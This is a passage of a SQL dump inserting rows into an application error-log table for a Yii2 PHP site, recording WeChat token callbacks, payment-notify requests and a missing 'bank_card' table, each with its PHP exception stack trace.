/phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('51', '1', 'yii\\base\\ErrorException:2', '1495111893.9061', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=976c8e50787a242d6c789fcf0ce06c37e0de1e68&timestamp=1495111893&nonce=161776738&openid=oAkX8wKcfsuvgImOkatqYhz-aYdg][58.247.206.152][-][m5ud847ma7r6k1v82dntb4ps12]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('52', '1', 'yii\\base\\ErrorException:2', '1495118558.5405', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=f7c5819f7fa1a4cae6844a2c155404da498b6527&timestamp=1495118558&nonce=880312960&openid=oAkX8wC4oCWaZm_eOkQOB6ZkeLYs][140.207.54.73][-][t086rp26s66vuhd3ni84ueulp3]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('53', '1', 'yii\\base\\ErrorException:2', '1495118574.1038', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=5973adbe3f75910e9cd3699a4506831cf973215b&timestamp=1495118574&nonce=669480306&openid=oAkX8wBoETu4ZEMIuSSaUD55iDA8][58.247.206.152][-][he6l535nk63dn3amj3k8bd5pp4]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('54', '1', 'yii\\base\\ErrorException:2', '1495118595.7325', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=6b8a1a7751396472158d9727342c15f6ad596e65&timestamp=1495118595&nonce=1350666544&openid=oAkX8wISVN4nrvo5A18DW9WKuxoU][140.207.54.74][-][vrhou3s337tk1fjaf8lm7hp6i7]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('55', '1', 'yii\\base\\ErrorException:8', '1495118827.4099', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+22%3a47%3a06&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+22%3a47%3a06&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][blqocvjbpettej6p5pg2cd1un1]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('56', '1', 'yii\\base\\ErrorException:8', '1495118838.0804', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+22%3a47%3a17&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+22%3a47%3a17&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][0spmq4454vtke5oi7av9a7mth3]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('57', '1', 'yii\\base\\ErrorException:8', '1495118856.3556', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+22%3a47%3a36&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+22%3a47%3a36&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][8j6uu6436u6auqcm6es81vhaf2]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('58', '1', 'yii\\base\\ErrorException:8', '1495118888.7719', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+22%3a48%3a08&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+22%3a48%3a08&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][kg23vr9gvbbqvo27fmpeimqqe1]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('59', '1', 'yii\\base\\ErrorException:2', '1495119024.6573', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=15f4bb8cfba88fc7b4b6691de6ff0b01eb32e55a&timestamp=1495119024&nonce=649499777&openid=oAkX8wGnUMQHIIBB5yocMMFqjJR8][58.247.206.145][-][obpsq7pfqgtbssram9393fv7h0]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('60', '1', 'yii\\base\\ErrorException:2', '1495119048.2712', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=468dbc670a0c4bbb8c453d502f5ff51e4ac8abe3&timestamp=1495119048&nonce=1187906561&openid=oAkX8wO6pEk5FZrKnbwcrwNSmvBc][58.247.206.145][-][f50c97qqpmbrdqlpqlic2ad7p4]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('61', '1', 'yii\\base\\ErrorException:2', '1495119048.7252', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=1fc9d613e0f42099c842ff52cdca2fd74d94a973&timestamp=1495119048&nonce=2023968489&openid=oAkX8wOSWMh0x3JPhOvKpnfooab0][58.247.206.145][-][p6hnmttdvv4vctm772keuq1o17]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('62', '1', 'yii\\base\\ErrorException:2', '1495119050.0811', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=da65abc26a54c1f9b3e91150581be780242cb5ba&timestamp=1495119050&nonce=43315148&openid=oAkX8wDNlOEs8vLhGMhrxHKtM_90][58.247.206.140][-][skfmg2hoei7ii2488k4s5nur04]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('63', '1', 'yii\\base\\ErrorException:8', '1495119071.4603', '[GET][http://www.semi-autogeneousmillprice.cn/site/tynotify?orderid=100012201705182246432280&opstate=0&ovalue=1100&systime=2017%2f05%2f18+22%3a51%3a11&sysorderid=1705182246441090653&completiontime=2017%2f05%2f18+22%3a51%3a11&attach=&msg=&sign=12636c950cb4e9f363b34e2486949798][211.149.156.143][-][f73ghjid0kkflrjit81q9vku12]', 'exception \'yii\\base\\ErrorException\' with message \'Undefined index: HTTP_USER_AGENT\' in /phpstudy/www/x50/frontend/components/Controller.php:20\nStack trace:\n#0 /phpstudy/www/x50/frontend/components/Controller.php(20): yii\\base\\ErrorHandler->handleError(8, \'Undefined index...\', \'/phpstudy/www/x...\', 20, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(21): frontend\\components\\Controller->beforeAction(Object(yii\\base\\InlineAction))\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(158): frontend\\controllers\\SiteController->beforeAction(Object(yii\\base\\InlineAction))\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'tynotify\', Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/tynotify\', Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#6 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#7 {main}');
INSERT INTO `log` VALUES ('64', '1', 'yii\\base\\ErrorException:2', '1495119090.7636', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=6b912c7acb385de41f3d96d1b215847269d8d6f7&timestamp=1495119090&nonce=864325627&openid=oAkX8wIbXM10P0qRdc37Ou2mRLAA][140.207.54.73][-][avkvkkbpahl70olkjpk1mr3ic1]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('65', '1', 'yii\\db\\Exception', '1495119101.5835', '[GET][http://www.semi-autogeneousmillprice.cn/user/bank-card][27.25.164.95][100014][58mb1imi8u6al3rok718271lb0]', 'exception \'PDOException\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php:900\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(900): PDOStatement->execute()\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\n\nNext exception \'yii\\db\\Exception\' with message \'SQLSTATE[42S02]: Base table or view not found: 1146 Table \'x50.bank_card\' doesn\'t exist\nThe SQL being executed was: SELECT * FROM `bank_card` `bankCard` WHERE `user_id`=100014\' in /phpstudy/www/x50/vendor/yiisoft/yii2/db/Schema.php:633\nStack trace:\n#0 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(915): yii\\db\\Schema->convertException(Object(PDOException), \'SELECT * FROM `...\')\n#1 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Command.php(376): yii\\db\\Command->queryInternal(\'fetch\', NULL)\n#2 /phpstudy/www/x50/vendor/yiisoft/yii2/db/Query.php(247): yii\\db\\Command->queryOne()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/db/ActiveQuery.php(290): yii\\db\\Query->one(NULL)\n#4 /phpstudy/www/x50/frontend/controllers/UserController.php(257): yii\\db\\ActiveQuery->one()\n#5 [internal function]: frontend\\controllers\\UserController->actionBankCard()\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#8 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'bank-card\', Array)\n#9 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'user/bank-card\', Array)\n#10 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#11 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#12 {main}\nAdditional Information:\nArray\n(\n    [0] => 42S02\n    [1] => 1146\n    [2] => Table \'x50.bank_card\' doesn\'t exist\n)\n');
INSERT INTO `log` VALUES ('66', '1', 'yii\\base\\ErrorException:2', '1495119246.4891', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=7eb06044eb9a20a269977989387a2316394ce734&timestamp=1495119246&nonce=512738577&openid=oAkX8wI7EiwsxAu1gumveVxXOuEE][58.247.206.157][-][ijp0a0sbria77jt37t2j0hb2s0]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
INSERT INTO `log` VALUES ('67', '1', 'yii\\base\\ErrorException:2', '1495120087.322', '[POST][http://www.semi-autogeneousmillprice.cn/site/wxtoken?signature=3715ab18ba7e8bf0aaffdab22e0d84ecf36e902e&timestamp=1495120087&nonce=1583155219&openid=oAkX8wHE5upUS2y4o_TWrIydxKuY][58.247.206.152][-][q7qd0est4eg5h98telcrh9g113]', 'exception \'yii\\base\\ErrorException\' with message \'explode() expects parameter 2 to be string, array given\' in /phpstudy/www/x50/frontend/controllers/SiteController.php:474\nStack trace:\n#0 [internal function]: yii\\base\\ErrorHandler->handleError(2, \'explode() expec...\', \'/phpstudy/www/x...\', 474, Array)\n#1 /phpstudy/www/x50/frontend/controllers/SiteController.php(474): explode(\'_\', Array)\n#2 [internal function]: frontend\\controllers\\SiteController->actionWxtoken()\n#3 /phpstudy/www/x50/vendor/yiisoft/yii2/base/InlineAction.php(55): call_user_func_array(Array, Array)\n#4 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Controller.php(160): yii\\base\\InlineAction->runWithParams(Array)\n#5 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Module.php(454): yii\\base\\Controller->runAction(\'wxtoken\', Array)\n#6 /phpstudy/www/x50/vendor/yiisoft/yii2/web/Application.php(84): yii\\base\\Module->runAction(\'site/wxtoken\', Array)\n#7 /phpstudy/www/x50/vendor/yiisoft/yii2/base/Application.php(375): yii\\web\\Application->handleRequest(Object(yii\\web\\Request))\n#8 /phpstudy/www/x50/frontend/web/index.php(18): yii\\base\\Application->run()\n#9 {main}');
